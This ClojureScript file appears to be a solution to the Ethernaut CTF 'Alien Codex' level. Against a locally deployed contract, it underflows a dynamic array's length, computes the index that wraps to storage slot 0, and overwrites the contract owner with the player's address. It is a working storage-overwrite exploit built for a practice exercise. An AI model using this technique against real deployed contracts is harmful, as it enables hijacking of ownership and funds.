(ns ctf.ethernaut.alien-codex
  (:require [ctf.ethernaut.utils :as u]
            [ctf.ethernaut.wallets :as w]
            [cljs.core.async :as a]
            [cljs.core.async.interop :refer-macros [<p!]])
  (:require-macros [ctf.core :refer [try-async]]))


;; Init the a new wallet for the player
;; Attach it with the local provider
(def player
  (w/get-player! w/local-provider))


(def two-raised-to-256
  (.add
   (u/big-num
    "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff")
   1))


(def codex-storage-slot
  "Owner (inherited from Ownable) and boolean `public`
   will be packed into 0th slot.

  Storage slot 1 will contain the head of the
  dynamic array bytes32[]. The head contains
  the length of the array. In the beginning, it will be 0."
  (u/big-num 1))


(def zero-index-slot
  "We are interested in the 0th element of the array
   since that will correspond to the storage slot 0.

   the  first array element will start at storage slot: keccak256(uint256(head))
   i.e. keccak256(uint256(codex-storage-slot)) or keccak256(uint256(1))."
  (u/big-num
   (.keccak256
    (.-utils u/ethers)
    (.hexZeroPad
     (.-utils u/ethers)
     (.hexlify (.-utils u/ethers)
               codex-storage-slot)
     32))))


(def target-index
  "After we have overflown the array by making its
  length = 2**256 - 1. We can access the whole storage
  using the indices of this array.

  Which means the 0th stroage slot will be
  same as:

  `2**256 (length of storage) - zero-index-slot`"
  (.sub two-raised-to-256 zero-index-slot))


(defn deploy-alien-codex!
  "Deploys the GatekeeperTwo contract using Owner's wallet!
   Returns the `js/Promise`."
  []
  (let [contract (u/contract :alien-codex
                             w/local-wallet)]
    (.deploy contract)))


(defn swap-owner
  []
  (try-async
   [alien-codex (<p! (deploy-alien-codex!))]
   (do
     ;; make `contacted` true
     (<p! (.make_contact alien-codex))
     ;; overflow the dynamic array
     (<p! (.retract alien-codex))
     ;; Override the Storage slot 0
     ;; with the address of the player
     (<p! (.revise alien-codex
                   target-index
                   (.hexZeroPad
                    (.-utils u/ethers)
                    (.-address player)
                    32)))
     (<p! (.codex alien-codex
                  target-index)))))



(comment

  ;; Execute to swap owner with the player
  ;; should print (.-address player)
  (a/take! (swap-owner) #(prn %))



  (-> (u/compile-all!)
      (.then #(.log js/console %))
      (.catch #(.log js/console %)))


  (def alien-codex (atom ""))
  (-> (deploy-alien-codex!)
      (.then #(reset! alien-codex %))
      (.catch #(.log js/console %)))


  (-> (.make_contact @alien-codex)
      (.then #(.log js/console %))
      (.catch #(.log js/console %)))


  ;; making storage slot 0 (array length) = 0xffff (64 fs)
  ;; each nibble contains 4 bits. 4 * 64 = 256 bits
  ;; now via indexes of the arrays you have access the whole Storage!!
  (-> (.retract @alien-codex)
      (.then #(.log js/console %))
      (.catch #(.log js/console %)))


  (-> (.codex @alien-codex target-index)
      (.then #(.log js/console %))
      (.catch #(.log js/console %)))


  (-> (.revise @alien-codex
               target-index
               (.hexZeroPad
                (.-utils u/ethers)
                (.-address player)
                32))
      (.then #(.log js/console %))
      (.catch #(.log js/console %)))


  (-> (.codex @alien-codex
              target-index)
      (.then #(.log js/console %))
      (.catch #(.log js/console %)))



  )
